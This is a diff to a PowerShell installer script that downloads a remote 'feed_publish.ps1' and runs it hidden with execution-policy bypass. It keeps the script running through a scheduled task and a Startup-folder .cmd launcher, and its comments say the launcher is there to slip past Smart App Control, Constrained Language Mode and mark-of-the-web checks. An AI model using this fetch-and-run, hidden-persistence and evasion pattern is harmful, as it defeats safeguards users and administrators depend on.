@@ -200,16 +200,42 @@ if ($Texe) {
 # ---------------------------------------------------------------------
 Say 'STEP 5 of 5 - connecting your account to the app ...'
 $feed = Join-Path $root 'feed_publish.ps1'
+$feedArgs = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $feed + '" -loop'
+try { Invoke-WebRequest -Uri ($BASEURL + 'feed_publish.ps1') -OutFile $feed -UseBasicParsing -TimeoutSec 60 }
+catch { Say ('   Could not download the feed script: ' + $_.Exception.Message) }
+
+# Preferred: a scheduled task. But on many home PCs (and whenever Smart App
+# Control is on) registering a task is denied without admin - so we ALSO put a
+# launcher in the Startup folder, which needs no admin and runs at every logon.
+$feedOk = $false
 try {
-    Invoke-WebRequest -Uri ($BASEURL + 'feed_publish.ps1') -OutFile $feed -UseBasicParsing -TimeoutSec 60
-    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $feed + '"')
-    $tr1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
-    $tr2 = New-ScheduledTaskTrigger -AtLogOn
+    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $feed + '" -loop')
+    $tr = New-ScheduledTaskTrigger -AtLogOn
     $set = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-    Register-ScheduledTask -TaskName 'IdanClubFeed' -Action $action -Trigger @($tr1,$tr2) -Settings $set -Force | Out-Null
-    Say '   Feed installed (updates the app every 2 minutes).'
-    Start-Process -FilePath 'powershell.exe' -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $feed + '"') -WindowStyle Hidden
-} catch { Say ('   Could not install the feed task: ' + $_.Exception.Message) }
+    Register-ScheduledTask -TaskName 'IdanClubFeed' -Action $action -Trigger $tr -Settings $set -Force -ErrorAction Stop | Out-Null
+    $feedOk = $true
+    Say '   Feed installed as a scheduled task.'
+} catch {
+    Say '   (no admin for a scheduled task - using the Startup folder instead, that is fine)'
+}
+
+# Startup-folder launcher - always installed, no admin needed. A plain .cmd is
+# not subject to Constrained Language Mode and carries no mark-of-the-web.
+try {
+    $startup = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup'
+    if (-not (Test-Path -LiteralPath $startup)) { New-Item -ItemType Directory -Path $startup -Force | Out-Null }
+    $cmd = Join-Path $startup 'IdanClubFeed.cmd'
+    $cmdText = '@echo off' + "`r`n" +
+               'start "" /min powershell ' + $feedArgs + "`r`n"
+    Set-Content -LiteralPath $cmd -Value $cmdText -Encoding ASCII
+    Say '   Feed set to start automatically at every logon (Startup folder).'
+} catch { Say ('   Could not add the Startup launcher: ' + $_.Exception.Message) }
+
+# start it right now so the member appears within ~1 minute
+try {
+    Start-Process -FilePath 'powershell.exe' -ArgumentList $feedArgs -WindowStyle Hidden
+    Say '   Feed running now (updates the app every 2 minutes).'
+} catch { Say ('   Could not start the feed now: ' + $_.Exception.Message) }
 
 # a friendly desktop shortcut to the app
 try {
